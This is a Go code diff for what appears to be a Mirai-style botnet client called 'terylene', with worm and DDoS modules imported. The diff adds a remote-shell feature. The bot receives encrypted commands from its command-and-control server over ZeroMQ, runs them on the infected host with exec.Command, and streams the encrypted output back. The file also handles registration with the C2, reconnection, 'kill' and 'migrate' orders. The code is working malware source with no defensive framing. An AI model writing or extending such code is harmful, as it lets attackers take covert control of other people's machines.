@@ -1,18 +1,27 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"log"
 	"os"
+	"os/exec"
 	"strconv"
 	"strings"
+	"sync"
 	config "terylene/config"
+	zcrypto "terylene/crypto"
 	system "terylene/mirai/components/system"
 	"terylene/mirai/components/worm"
 	attack "terylene/mirai/ddos"
+
 	"time"
 
 	zmq "github.com/pebbe/zmq4"
+)
+
+var (
+	dealmut sync.Mutex
 )
 
 type postC2info struct {
@@ -139,13 +148,13 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 				break
 			case <-time.After(time.Second * 20):
 				log.Println("reconnecting dealer channel")
-				dealer, err := zmqins.zcontext.NewSocket(zmq.DEALER)
+				ndealer, err := zmqins.zcontext.NewSocket(zmq.DEALER)
 				if err != nil {
 					log.Fatalln(err)
 				}
-				log.Println("reregisteration initiating")
+				log.Println("reregistration initiating")
 
-				err = dealer.Connect(fmt.Sprintf("tcp://%s:%s", C2info.postC2info.C2ip, C2info.postC2info.rport))
+				err = ndealer.Connect(fmt.Sprintf("tcp://%s:%s", C2info.postC2info.C2ip, C2info.postC2info.rport))
 				if err != nil {
 					log.Fatalln(err)
 				}
@@ -160,13 +169,12 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 				log.Println("generating Conn ID")
 				connId := system.GenerateConnID(localip, pubip)
 
-				_, err = dealer.SendMessage("reg", arch, OS, localip, pubip, connId)
+				ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)
 
-				res, err := dealer.RecvMessage(0)
+				res, err := ndealer.RecvMessage(0)
 				fmt.Println(res)
 				if res[0] == "terylene" {
-					go dealerhandle(zmqins.zdealer, dealdown, migsignal)
-					break
+					go dealerhandle(ndealer, dealdown, migsignal, res[2])
 				} else {
 					log.Fatalln("router reconnection declined")
 				}
@@ -214,13 +222,13 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 				log.Println("generating Conn ID")
 				connId := system.GenerateConnID(localip, pubip)
 
-				_, err = ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)
+				ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)
 
 				res, err := ndealer.RecvMessage(0)
 				fmt.Println(res)
 
 				if res[0] == "terylene" {
-					go dealerhandle(ndealer, dealdown, migsignal)
+					go dealerhandle(ndealer, dealdown, migsignal, res[2])
 				} else {
 					log.Fatalln("router reregistration declined")
 				}
@@ -286,7 +294,7 @@ func register(zmqins zmqinstance, postinfo postC2info, timeout time.Duration) er
 		}
 
 		go signalhandler(zmqins, C2info, conninfo, subdown, dealdown, reconsignal, submigsignal, dealmigsignal, migsignal)
-		go dealerhandle(dealer, dealdown, dealmigsignal)
+		go dealerhandle(dealer, dealdown, dealmigsignal, res[2])
 		go subhandler(subscriber, postinfo.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown, submigsignal)
 		recmig(zmqins, postinfo, reconsignal, migsignal)
 		return nil
@@ -316,7 +324,7 @@ func register(zmqins zmqinstance, postinfo postC2info, timeout time.Duration) er
 				}
 
 				go signalhandler(zmqins, C2info, conninfo, subdown, dealdown, reconsignal, submigsignal, dealmigsignal, migsignal)
-				go dealerhandle(dealer, dealdown, dealmigsignal)
+				go dealerhandle(dealer, dealdown, dealmigsignal, res[2])
 				go subhandler(subscriber, postinfo.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown, submigsignal)
 				recmig(zmqins, postinfo, reconsignal, migsignal)
 				return nil
@@ -328,9 +336,105 @@ func register(zmqins zmqinstance, postinfo postC2info, timeout time.Duration) er
 	return err
 }
 
-func dealerhandle(dealer *zmq.Socket, dealdown chan<- struct{}, dealmigsignal chan<- postC2info) {
+func cmdhandler(command string, key []byte, dealer *zmq.Socket) {
+	if command == "clear" {
+		return
+	}
+
+	parts := strings.Fields(command)
+
+	if len(parts) == 0 {
+		log.Println("Empty command received")
+		return
+	}
+
+	if parts[0] == "cd" {
+		if len(parts) < 2 {
+			output := "Invalid 'cd' command: Missing argument"
+			encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(output), key)
+			if err != nil {
+				log.Println(err)
+				return
+			}
+			dealer.SendMessage("cmdE", string(encoutput))
+		}
+
+		err := os.Chdir(parts[1])
+		if err != nil {
+			output := fmt.Sprintf("Error changing directory:%s", err)
+			encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(output), key)
+			if err != nil {
+				log.Println(err)
+				return
+			}
+			dealer.SendMessage("cmdE", string(encoutput))
+		}
+		return
+	}
+
+	cmd := exec.Command(parts[0], parts[1:]...)
+
+	// Get pipe for standard output
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		fmt.Println("Error creating StdoutPipe for Cmd", err)
+		return
+	}
+
+	// Start command
+	if err := cmd.Start(); err != nil {
+		encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(err.Error()), key)
+		if err != nil {
+			log.Println(err)
+			return
+		}
+		dealer.SendMessage("cmdE", string(encoutput))
+
+		return
+	}
+
+	// Create new reader from the pipe
+	reader := bufio.NewReader(stdout)
+
+	// Goroutine for printing the output
+	go func() {
+		for {
+			output, _, err := reader.ReadLine()
+			if err != nil {
+				break
+			}
+
+			encoutput, err := zcrypto.EncryptChaCha20Poly1305(output, key)
+			if err != nil {
+				log.Println(err)
+				continue
+			}
+			dealer.SendMessage("cmdS", string(encoutput))
+		}
+	}()
+
+	// Wait for the command to finish
+	err = cmd.Wait()
+	if err != nil {
+		if err.Error() == "exit status 255" {
+			return
+		}
+		output := fmt.Sprintf("Error waiting for command:%s", err)
+		encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(output), key)
+		if err != nil {
+			log.Println(err)
+		}
+		dealer.SendMessage("cmdE", string(encoutput))
+	}
+}
+
+func dealerhandle(dealer *zmq.Socket, dealdown chan<- struct{}, dealmigsignal chan<- postC2info, key string) {
 	log.Println("Subscribed to the dealer socket")
 	dealer.SetRcvtimeo(time.Second * 10)
+	polykey, err := zcrypto.DecryptAES256(key, []byte(config.AESkey))
+	if err != nil {
+		log.Fatalln(err)
+	}
 	for {
 		res, err := dealer.RecvMessage(0)
 		if err != nil {
@@ -343,13 +447,25 @@ func dealerhandle(dealer *zmq.Socket, dealdown chan<- struct{}, dealmigsignal ch
 		}
 
 		if res[0] == "h" {
+			dealmut.Lock()
 			dealer.SendMessage("h")
+			dealmut.Unlock()
 		}
 
 		if res[0] == "kill" {
 			log.Fatalln("killed by C2 owner")
 		}
 
+		if len(res) == 2 {
+			if res[0] == "cmd" {
+				command, err := zcrypto.DecryptChaCha20Poly1305([]byte(res[1]), polykey)
+				if err != nil {
+					log.Println(err)
+					continue
+				}
+				go cmdhandler(string(command), []byte(polykey), dealer)
+			}
+		}
 		if len(res) == 3 {
 			if res[0] == "migrate" {
 				var details postC2info
@@ -363,6 +479,7 @@ func dealerhandle(dealer *zmq.Socket, dealdown chan<- struct{}, dealmigsignal ch
 				break
 			}
 		}
+
 	}
 }
 
